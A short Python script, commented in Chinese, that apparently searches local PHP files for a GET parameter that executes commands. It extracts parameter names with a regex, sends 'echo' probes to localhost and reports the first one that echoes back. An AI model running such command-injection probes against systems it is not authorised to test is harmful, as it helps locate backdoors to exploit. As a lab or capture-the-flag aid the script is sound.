# -*- coding: UTF-8 -*-
import re
import os
import requests


files = os.listdir(r'/var/www/html/test/')    #获取路径下的所有文件
reg = re.compile(r'(?<=_GET\[\').*(?=\'\])')   #设置正则
for i in files:                #从第一个文件开始
    url = "http://127.0.0.1/test/" + i
    f = open("/var/www/html/test/"+i)        #打开这个文件
    data = f.read()           #读取文件内容
    f.close()                 #关闭文件
    result = reg.findall(data)  #从文件中找到GET请求
    for j in result:           #从第一个GET参数开始
        payload = url + "?" + j + "=echo ******"   ##尝试请求次路径，并执行命令
        # print(payload)
        html = requests.get(payload)
        if "******" in html.text:
            print(payload)
            exit(1)
